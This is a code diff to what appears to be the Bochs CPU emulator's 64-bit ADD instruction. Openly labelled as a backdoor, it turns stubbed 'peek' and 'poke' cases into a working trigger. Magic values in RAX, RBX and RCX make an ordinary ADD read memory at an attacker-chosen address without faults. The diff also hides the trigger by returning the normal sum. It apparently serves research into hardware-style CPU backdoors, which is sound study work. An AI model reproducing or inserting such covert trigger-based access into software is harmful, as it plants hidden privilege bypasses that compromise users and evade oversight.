@@ -46,6 +46,8 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_EqGqM(bxInstruction_c *i)
 BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
 { // this is the one we wanna backd00r
   Bit64u op1_64, op2_64, sum_64;
+  uint8_t error = 1;
+  uint8_t data = 0xcc;
 
   op1_64 = BX_READ_64BIT_REG(i->dst());
   op2_64 = BX_READ_64BIT_REG(i->src());
@@ -89,25 +91,17 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
   if ((RAX == 0x99a0086fba28dfd1) && (RBX == 0xe2dd84b5c9688a03)) {
       // we have a valid ubercall, let's do this texas-style
       switch (RCX) {
-          case 0xabadbabe00000001: // peek
-              /* FIXME -- pretend we did the peek */
-              BX_CPU_THIS_PTR evil.evilbyte = 0xabeddab1ebabe;
-              BX_CPU_THIS_PTR evil.evilstatus = 0x5ca1ab1ebeef;;
-              break;
-          case 0xabadbabe00000002: // poke
-              /* FIXME -- pretend we did the poke */
-              BX_CPU_THIS_PTR evil.evilbyte = 0xbeefbeefbeefbeef;
-              BX_CPU_THIS_PTR evil.evilstatus = 0xf01dab1ecab005e;;
+          case 0xabadbabe00000001: // peek, virtual
+              access_read_linear_nofail(RDX, 1, 0, BX_READ, (void *) &data, &error);
+              BX_CPU_THIS_PTR evil.evilbyte = data;
+              BX_CPU_THIS_PTR evil.evilstatus = error;
               break;
       }
       BX_CPU_THIS_PTR evil.out_stat = 0; /* we start at the hi half of the
                                             output block now */
-      BX_WRITE_64BIT_REG(i->dst(), 0xB100D1EDBEEF);
-  } else {
-      BX_WRITE_64BIT_REG(i->dst(), sum_64);
   }
 
-
+  BX_WRITE_64BIT_REG(i->dst(), sum_64);
 
   SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);
 
